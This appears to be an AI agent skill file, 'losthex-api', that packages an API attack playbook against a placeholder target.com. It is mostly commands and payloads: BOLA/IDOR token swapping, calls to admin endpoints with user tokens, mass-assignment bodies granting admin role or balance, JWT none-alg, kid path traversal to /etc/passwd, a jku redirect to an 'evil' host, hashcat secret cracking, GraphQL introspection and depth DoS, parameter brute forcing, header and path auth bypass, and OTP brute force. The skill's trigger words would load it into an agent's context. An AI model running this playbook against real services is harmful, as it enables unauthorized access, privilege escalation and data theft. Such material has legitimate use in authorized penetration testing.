---
name: losthex-api
description: >-
  API security — BOLA/IDOR, BFLA, mass assignment, JWT/OAuth abuse, GraphQL, hidden params. Triggers: BOLA, IDOR, BFLA, mass assignment, JWT abuse, OAuth, GraphQL, hidden parameters, API authorization, broken object level auth.
---
# LostHex-API

## Gate

```bash
python "$HOME/.workbuddy-ai/skills/losthex-hack/scripts/gate.py"   # bundled gate = HexStrike health check
# hexstrike: nuclei_scan, jwt_tool, graphql scanner
```

## 1) Recon (api-recon-and-docs)

```bash
# openapi/swagger discovery
ffuf -u https://target.com/FUZZ -w api-wordlist.txt -mc 200,301,302 -o api_dirs.txt
# words: /api, /v1, /v2, /swagger, /openapi.json, /graphql, /graphiql
curl -s https://target.com/openapi.json | jq '.paths | keys'
curl -s https://target.com/swagger.json | jq
# JS -> endpoint mining
grep -Roh "/api/[^\"]*" *.js | sort -u > js_api.txt
# param mining
# ทดลอง OPTIONS, 403 vs 404 diff
```

## 2) BOLA / IDOR

```bash
# เปลี่ยน id เป็นของคนอื่น
curl -H "Authorization: Bearer <victim_token>" https://target.com/api/user/123
curl -H "Authorization: Bearer <attacker_token>" https://target.com/api/user/123
# diff: 200 vs 403? ถ้า 200 + data ของคนอื่น = BOLA
# ลอง UUID brute / sequential id / /api/users/me vs /api/users/1
```

## 3) BFLA / Mass Assignment

```bash
# BFLA: เรียก admin endpoint ด้วย user token
curl -H "Authorization: Bearer <user_token>" https://target.com/api/admin/users
# Mass assignment: เติม field ที่ไม่ควรแก้
curl -X POST -H "Authorization: Bearer <t>" -d '{"name":"a","role":"admin","isAdmin":true}' https://target.com/api/user
curl -X PUT -d '{"email":"x@x.com","balance":9999}' https://target.com/api/account/1
```

## 4) JWT / OAuth

```bash
# JWT: none alg
# header: {"alg":"none"} -> verify 200
# kid traversal: {"kid":"../../etc/passwd"} / kid SQLi
# jku/x5u -> host to evil
# weak secret: hashcat -a 0 -m 16500 jwt.txt wordlist
python -c "import jwt; print(jwt.decode(token, options={'verify_signature':False}))"
# OAuth: open redirect in redirect_uri, code leak via referer, PKCE downgrade
```

## 5) GraphQL

```bash
# introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' https://target.com/graphql
curl -X POST -d '{"query":"query{__typename}"}' https://target.com/graphql
# batching / alias brute
# field suggestion leak: {"query":"{ invalid }"} -> did you mean?
# depth/complexity DoS: nested query 10 levels
```

## 6) Hidden params (graphql-and-hidden-parameters)

```bash
# arjun / param miner
arjun -u https://target.com/api/user --get --post -o arjun.json
# ffuf param brute
ffuf -u "https://target.com/api/user?FUZZ=1" -w params.txt -mc 200 -fs <baseline_len>
```

Verify ทุก finding ด้วย 2 accounts (victim vs attacker) + diff response

## Auth Bypass & Sec

```bash
# auth bypass — ดู authbypass-authentication-flaws + auth-sec
# 1) verb tamper: POST -> GET, 2) path: /admin -> /%2e/admin, 3) header: X-Original-URL
curl -H "X-Original-URL: /admin" https://target.com/blocked
curl -X GET https://target.com/api/admin  # vs POST 403 -> GET 200?
# JWT alg none / kid / jku already above; add: OTP brute (0000-9999), 2FA bypass via response manipulation
```


Ponytail: ตัด rate-limit bypass แบบ IP spoof — ceiling = header brute + account rotation, upgrade เมื่อมี gateway fingerprint.